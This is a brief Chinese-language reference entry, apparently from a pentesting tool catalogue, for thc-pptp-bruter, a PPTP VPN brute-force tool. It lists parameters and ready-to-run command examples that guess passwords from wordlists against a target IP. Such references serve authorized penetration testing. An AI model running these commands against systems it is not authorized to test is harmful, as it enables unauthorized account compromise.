# thc-pptp-bruter

## 简介
PPTP VPN 暴力破解工具

## 核心参数
- 目标 IP
- 用户名和密码列表

## 命令示例
```bash
# 基本暴力破解
thc-pptp-bruter -u admin -W passwords.txt 192.168.1.100

# 使用用户名列表
thc-pptp-bruter -U users.txt -W passwords.txt 192.168.1.100

# 指定线程数
thc-pptp-bruter -u admin -W passwords.txt -t 4 192.168.1.100

# 详细输出
thc-pptp-bruter -v -u admin -W passwords.txt 192.168.1.100
```

## 使用场景
暴力破解 PPTP VPN 服务

## 所属分类
- [暴力破解 (Brute Force)](../categories/07-brute-force.md)
